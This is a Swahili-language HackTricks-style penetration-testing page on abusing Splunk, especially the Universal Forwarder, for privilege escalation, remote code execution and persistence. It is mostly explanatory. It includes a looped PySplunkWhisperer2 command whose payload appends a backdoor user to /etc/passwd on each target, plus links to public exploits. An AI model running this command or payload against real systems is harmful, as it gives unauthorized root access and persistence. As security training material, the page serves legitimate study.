# Splunk LPE na Uendelevu

{{#include ../../banners/hacktricks-training.md}}

Ikiwa **unapofanya hesabu** ya mashine **ndani** au **nje** unakuta **Splunk inafanya kazi** (port 8090), ikiwa kwa bahati unajua **akili halali** unaweza **kutumia huduma ya Splunk** ili **kufanya shell** kama mtumiaji anayekimbia Splunk. Ikiwa root inafanya kazi, unaweza kuongeza mamlaka hadi root.

Pia ikiwa wewe ni **tayari root na huduma ya Splunk haisikii tu kwenye localhost**, unaweza **kuiba** faili ya **nenosiri** **kutoka** huduma ya Splunk na **kuvunja** nenosiri, au **kuongeza** akili mpya kwake. Na kudumisha uendelevu kwenye mwenyeji.

Katika picha ya kwanza hapa chini unaweza kuona jinsi ukurasa wa Splunkd unavyoonekana.

## Muhtasari wa Ulaghai wa Agent wa Splunk Universal Forwarder

Kwa maelezo zaidi angalia chapisho [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Hii ni muhtasari tu:

**Muonekano wa Ulaghai:**
Ulaghai unaolenga Agent wa Splunk Universal Forwarder (UF) unaruhusu washambuliaji wenye nenosiri la agent kutekeleza msimbo wowote kwenye mifumo inayokimbia agent, ambayo inaweza kuhatarisha mtandao mzima.

**Mambo Muhimu:**

- Agent wa UF hauhakiki muunganisho unaokuja au uhalali wa msimbo, hivyo unakuwa hatarini kwa utekelezaji wa msimbo usioidhinishwa.
- Njia za kawaida za kupata nenosiri ni pamoja na kuzitafuta kwenye directories za mtandao, kushiriki faili, au nyaraka za ndani.
- Ulaghai uliofanikiwa unaweza kusababisha ufikiaji wa kiwango cha SYSTEM au root kwenye wenyeji walioathirika, uhamasishaji wa data, na kuingia zaidi kwenye mtandao.

**Utekelezaji wa Ulaghai:**

1. Mshambuliaji anapata nenosiri la agent wa UF.
2. Anatumia API ya Splunk kutuma amri au skripti kwa mawakala.
3. Vitendo vinavyowezekana ni pamoja na uchimbaji wa faili, usimamizi wa akaunti za watumiaji, na kuathiri mfumo.

**Athari:**

- Kuathiri mtandao mzima kwa ruhusa za kiwango cha SYSTEM/root kwenye kila mwenyeji.
- Uwezekano wa kuzima logging ili kuepuka kugunduliwa.
- Usanidi wa backdoors au ransomware.

**Amri ya Mfano kwa Ulaghai:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Matumizi ya umma ya exploits:**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Kutumia Maswali ya Splunk

**Kwa maelezo zaidi angalia chapisho [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
